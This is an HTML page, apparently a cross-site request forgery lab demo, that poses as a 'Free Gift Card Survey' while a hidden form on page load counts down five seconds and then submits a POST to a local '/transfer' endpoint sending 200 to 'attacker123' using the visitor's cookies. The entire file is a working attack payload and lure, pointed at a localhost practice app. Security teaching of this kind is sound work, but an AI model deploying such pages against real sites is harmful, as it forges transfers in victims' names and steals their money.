<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Totally Harmless Site :)</title>
</head>
<body>
  <h1>Free Gift Card Survey</h1>
  <p id="status">
    Thanks for visiting! Please wait while we load your survey...
  </p>

  <!--
    This form silently submits a POST request to the vulnerable app.
    The victim's browser will automatically include their cookies.
  -->
  <form id="csrf-attack" action="http://localhost:5002/transfer" method="post">
    <input type="hidden" name="to_account" value="attacker123" />
    <input type="hidden" name="amount" value="200" />
  </form>

  <script>
    // Delay the attack so it's easier to see what's happening.
    const status = document.getElementById("status");
    let seconds = 5;

    function updateStatus() {
      status.textContent =
        "Loading your survey... (submitting in " + seconds + " seconds)";
      seconds--;

      if (seconds < 0) {
        status.textContent = "Submitting request now...";
        document.getElementById("csrf-attack").submit();
      } else {
        setTimeout(updateStatus, 1000);
      }
    }

    window.addEventListener("load", updateStatus);
  </script>
</body>
</html>
